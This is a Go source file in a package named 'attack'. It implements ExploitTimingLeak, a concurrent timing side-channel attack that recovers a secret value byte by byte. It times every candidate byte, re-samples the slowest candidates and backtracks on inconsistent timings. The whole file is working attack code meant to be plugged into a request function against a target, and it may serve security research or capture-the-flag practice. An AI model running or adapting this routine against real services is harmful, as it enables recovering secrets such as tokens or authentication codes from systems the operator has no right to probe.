package attack

import (
	"bytes"
	"cmp"
	"context"
	"fmt"
	"time"
)

// ExploitTimingLeak attempts to recover a value of targetValueSize length via a
// timing attack. Possible values are tested via calls to timeRequest, which may
// be made concurrently. The maximum number of concurrent requests is controlled
// via maxConcurrentRequests.
//
// When attempting to recover a particular byte of the target value,
// topCandidateCount controls how many of the most promising byte values should
// be subjected to additional timing before choosing a final candidate. The
// total number of timings that should be taken for each of those candidates
// is controlled by topCandidateSampleCount.
//
// An error is returned if timeRequest returns an error or if no valid value is
// found. Note that not every possible value is necessarily tested.
//
// When not nil, logf is used to log the attack's progress.
//
// It panics if maxConcurrentRequests is less than 1, if topCandidateCount is
// less than 1 or greater than 256, or if topCandidateSampleCount is less than
// 1.
func ExploitTimingLeak(
	ctx context.Context,
	targetValueSize int,
	timeRequest func(ctx context.Context, targetValue []byte) (d time.Duration, valid bool, err error),
	maxConcurrentRequests,
	topCandidateCount,
	topCandidateSampleCount int,
	logf func(format string, a ...any),
) ([]byte, error) {
	switch {
	case maxConcurrentRequests < 1:
		panic("maxConcurrentRequests not > 0")
	case topCandidateCount < 1 || topCandidateCount > 256:
		panic("topCandidateCount not in range [1, 256]")
	case topCandidateSampleCount < 1:
		panic("topCandidateSampleCount not > 0")
	}

	ctx, cancel := context.WithCancel(ctx)
	defer cancel()

	var (
		target       = make([]byte, targetValueSize)
		avgDurations = make([]time.Duration, targetValueSize)
		in           = make(chan timingRequest)
		out          = make(chan timingResult)
	)

	// Run workers to process queries.
	for i := 0; i < maxConcurrentRequests; i++ {
		go func() {
			for req := range in {
				d, valid, err := timeRequest(ctx, req.target)
				out <- timingResult{
					byteValue: req.byteValue,
					duration:  d,
					valid:     valid,
					err:       err,
				}
			}
		}()
	}

	for byteIndex := 0; byteIndex < len(target); {
		bvt := newByteValueTimings()

		values := make([]byte, 256)
		for i := range values {
			values[i] = byte(i)
		}

		// We'll run topCandidateSampleCount iterations, timing all 256 possible
		// byte values on the first iteration, and only the topCandidateCount
		// slowest byte values for the remaining iterations.
		for i := 0; i < topCandidateSampleCount; i++ {
			// Switch to only timing the topCandidateCount slowest byte values.
			if i > 0 {
				values = bvt.nSlowestValues(topCandidateCount)
			}

			// Create the requests upfront so access to target does not need
			// to be synchronized between the goroutines pushing and popping
			// jobs.
			reqs := make([]timingRequest, len(values))
			for i, v := range values {
				t := bytes.Clone(target)
				t[byteIndex] = v
				reqs[i] = timingRequest{target: t, byteValue: v}
			}

			// Push requests into workers.
			go func() {
				for _, req := range reqs {
					in <- req
				}
			}()

			// Consume results produced by workers.
			for i := 0; i < len(reqs); i++ {
				r := <-out
				if r.err != nil {
					return nil, fmt.Errorf("timing request: %w", r.err)
				}

				if r.valid {
					target[byteIndex] = r.byteValue
					if logf != nil {
						logf("%-2d: %x\n", byteIndex, target)
					}
					return target, nil
				}

				bvt.add(r.byteValue, r.duration)
			}
		}

		target[byteIndex] = bvt.slowestValue()

		if logf != nil {
			logf("%-2d: %x\n", byteIndex, target)
		}

		// If this byte took less or equal time to recover than the previous
		// one then the previously chosen value is likely wrong so we'll
		// backtrack. Otherwise, move on to the next byte.
		d := bvt.avgRequestDuration()
		avgDurations[byteIndex] = d

		if byteIndex > 0 && d <= avgDurations[byteIndex-1] {
			byteIndex--
		} else {
			byteIndex++
		}
	}

	return nil, fmt.Errorf("unable to recover target")
}

type timingRequest struct {
	target    []byte
	byteValue byte
}

type timingResult struct {
	byteValue byte
	duration  time.Duration
	valid     bool
	err       error
}

// byteValueTimings tracks request durations for each possible byte value. Each
// row index represents the byte decimal value. Timings for each byte value are
// ordered for faster processing.
type byteValueTimings []orderedSlice[time.Duration]

func newByteValueTimings() byteValueTimings {
	return make(byteValueTimings, 256)
}

// add adds the value timing.
func (s byteValueTimings) add(v byte, d time.Duration) {
	s[v].insert(d)
}

// avgRequestDuration calculates the average duration among all durations of all
// byte values.
func (s byteValueTimings) avgRequestDuration() time.Duration {
	var sum time.Duration
	var n int
	for _, durations := range s {
		sum += durations.sum()
		n += len(durations)
	}
	return sum / time.Duration(n)
}

// slowestValue returns the byte value with the longest median duration.
func (s byteValueTimings) slowestValue() byte {
	var vMax byte
	var dMax time.Duration
	for i := range s {
		d := s[i].median()
		if d > dMax {
			vMax = byte(i)
			dMax = d
		}
	}
	return vMax
}

// nSlowestValues returns the top n byte values with the longest median
// duration, ordered from longest to shortest.
func (s byteValueTimings) nSlowestValues(n int) []byte {
	if n == 0 {
		panic("n not greater than 0")
	}

	slowest := make([]byte, n)
	for i := 0; i < len(s); i++ {
		if s[slowest[n-1]].median() >= s[i].median() {
			continue
		}

		slowest[n-1] = byte(i)

		// Re-sort values longest to shortest.
		for i := len(slowest) - 1; i >= 1; i-- {
			if s[slowest[i-1]].median() >= s[slowest[i]].median() {
				break
			}
			slowest[i-1], slowest[i] = slowest[i], slowest[i-1]
		}
	}

	return slowest[:n]
}

// orderedSlice maintains a list of values in ascending order.
type orderedSlice[T cmp.Ordered] []T

func (s *orderedSlice[T]) insert(v T) {
	*s = append(*s, v)
	p := *s
	for i := len(p) - 1; i >= 1 && p[i-1] > p[i]; i-- {
		p[i-1], p[i] = p[i], p[i-1]
	}
}

func (s orderedSlice[T]) median() T {
	return s[len(s)/2]
}

func (s orderedSlice[T]) sum() T {
	var sum T
	for _, v := range s {
		sum += v
	}
	return sum
}
